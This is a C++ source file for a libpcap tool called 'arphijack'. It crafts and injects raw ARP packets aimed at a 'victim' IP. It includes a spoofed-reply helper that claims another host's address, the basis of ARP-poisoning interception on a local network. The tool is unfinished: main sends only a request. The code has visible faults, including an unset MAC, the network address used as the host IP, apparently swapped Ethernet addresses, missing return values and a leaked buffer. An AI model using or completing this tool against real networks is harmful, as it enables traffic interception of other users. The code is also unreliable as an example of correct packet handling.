#include <cstdlib>
#include <cstring>
#include <string>

#include <pcap.h>
#include <net/ethernet.h>
#include <arpa/inet.h>

using namespace std;

namespace
{
    char    g_szLastErr[PCAP_ERRBUF_SIZE] = {0};
    u_char  g_pMyMAC[ETH_ALEN] = {0};
    string  g_szMyIP;
};

#define MY_ASSERT(expr) \
    if (!(expr)) \
    { \
        printf("Assertion failed: %s\n", #expr); \
        return EXIT_FAILURE; \
    }

typedef struct
{
    u_int16_t   hardwareType;		    /* Format of hardware address.  */
    u_int16_t   protocolType;		    /* Format of protocol address.  */
    u_int8_t    hardwareSize;		    /* Length of hardware address.  */
    u_int8_t    protocolSize;		    /* Length of protocol address.  */
    u_int16_t   opcode;		            /* ARP opcode (command).  */
    u_int8_t    senderMAC[ETH_ALEN];	/* Sender hardware address.  */
    u_int16_t   senderIP[2];		    /* Sender IP address. Now I really hate memory alignments.  */ 
    u_int8_t    targetMAC[ETH_ALEN];	/* Target hardware address.  */
    u_int16_t   targetIP[2];		    /* Target IP address.  */
} ARPPacket;

#define COPY_OR_ZERO(dest, src, len) \
    if (src) \
        memcpy(dest, src, len); \
    else \
        memset(dest, 0, len);

void WriteARP(u_char* pPacket,
              unsigned int& nPos,
              bool bRequest,
              const u_char* pSenderMAC,
              const char* szSenderIP,
              const u_char* pTargetMAC,
              const char* szTargetIP)
{
    ARPPacket* pARP = reinterpret_cast<ARPPacket*>(pPacket+nPos);
    
    pARP->hardwareType  = htons(0x0001);
    pARP->protocolType  = htons(0x0800);
    pARP->hardwareSize  = 0x06;
    pARP->protocolSize  = 0x04;
    pARP->opcode        = htons(bRequest?0x0001:0x0002);
    
    COPY_OR_ZERO(pARP->senderMAC, pSenderMAC, ETH_ALEN * sizeof(u_char));
    
    printf("Sender=%s\n", szSenderIP);
    in_addr senderAddr;
    inet_aton(szSenderIP, &senderAddr);
    memcpy(pARP->senderIP, &senderAddr, sizeof(in_addr));
    
    COPY_OR_ZERO(pARP->targetMAC, pTargetMAC, ETH_ALEN * sizeof(u_char));
    
    in_addr targetAddr;
    inet_aton(szTargetIP, &targetAddr);
    memcpy(pARP->targetIP, &targetAddr, sizeof(in_addr));
    
    nPos += sizeof(ARPPacket);
}             
    
void WriteEthernet(u_char* pPacket,
                   unsigned int& nPos,
                   const u_char* pSrc,
                   const u_char* pDst)
{
    ether_header* pEth = reinterpret_cast<ether_header*>(pPacket+nPos);
    
    COPY_OR_ZERO(pEth->ether_dhost, pDst, ETH_ALEN * sizeof(u_char));
    COPY_OR_ZERO(pEth->ether_shost, pSrc, ETH_ALEN * sizeof(u_char));
    pEth->ether_type = htons(0x0806);
    
    nPos += sizeof(ether_header);
}

int CreateARPPacket(bool bRequest,
                    const u_char* pSenderMAC,
                    const string& szSenderIP,
                    const u_char* pTargetMAC,
                    const string& szTargetIP,
                    u_char** pOutPacket, uint16_t& uOutPacketSize)
{
    try
    {
        u_int16_t uPacketSize = sizeof(ether_header) + sizeof(ARPPacket);
        u_char* pPacket = new u_char[uPacketSize+1];
        MY_ASSERT(pPacket);
        memset(pPacket, 0, (uPacketSize+1) * sizeof(u_char));
        
        unsigned int nOutPos=0;
        
        WriteEthernet(pPacket, nOutPos,
                      pTargetMAC,
                      g_pMyMAC);
        
        WriteARP(pPacket, nOutPos,
                 bRequest,
                 pSenderMAC,
                 szSenderIP.c_str(),
                 pTargetMAC,
                 szTargetIP.c_str());
                 
        *pOutPacket = pPacket;
        uOutPacketSize = uPacketSize;
    }
    catch (...)
    {
        printf("Exception occurred in %s\n", __FUNCTION__);
        return -2;
    }
}

int InjectARPPacket(pcap_t* handle,
                    bool bRequest,
                    const u_char* pSenderMAC,
                    const string& szSenderIP,
                    const u_char* pTargetMAC,
                    const string& szTargetIP)
{
    u_char* pARPPacket = NULL;
    u_int16_t uPacketSize = 0;
    CreateARPPacket(bRequest, pSenderMAC, szSenderIP, pTargetMAC, szTargetIP, &pARPPacket, uPacketSize);
    
    pcap_inject(handle, reinterpret_cast<void*>(pARPPacket), uPacketSize);
    
    printf("ARP packet injected.\n");
}

inline int SendARPRequest(pcap_t* handle, const string& szIP)
{
    return InjectARPPacket(handle, true, g_pMyMAC, g_szMyIP, NULL, szIP);
}

inline int SendARPReply(pcap_t* handle,
                        const string& szClaimIP,
                        const u_char* pDestMAC,
                        const string& szDestIP)
{
    return InjectARPPacket(handle, false, g_pMyMAC, szClaimIP, pDestMAC, szDestIP);
}

int main(int argc, char** argv)
{
    if (argc < 2)
    {
        printf("Usage: arphijack [victim-ip] [options]\n");
        printf("Options:\n");
        printf("-d --device [dev]\n");
        printf("  Listen to the specified device.\n");
        return EXIT_FAILURE;
    }
    
    const char* szVictimIP = argv[1];
    const char* szDevice   = NULL;
    
    for (uint8_t i=2; i<argc; i++)
    {
        if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--device") == 0)
            szDevice = argv[++i];
    }

    if (!szDevice)
        szDevice = pcap_lookupdev(g_szLastErr);
        
    MY_ASSERT(szDevice);
    printf("Listening on %s\n", szDevice);
    printf("Victim: %s\n", szVictimIP);
    
    bpf_u_int32 net;
    bpf_u_int32 mask;
    MY_ASSERT(pcap_lookupnet(szDevice, &net, &mask, g_szLastErr) != -1);
    
    in_addr myIPAddr;
    myIPAddr.s_addr = net;
    g_szMyIP = string(inet_ntoa(myIPAddr));
    printf("I am %s\n", g_szMyIP.c_str());
    
    pcap_t* handle = pcap_open_live(szDevice, BUFSIZ, 1, -1, g_szLastErr);
    MY_ASSERT(handle);
    
    SendARPRequest(handle, szVictimIP);
    
    return 0;
}

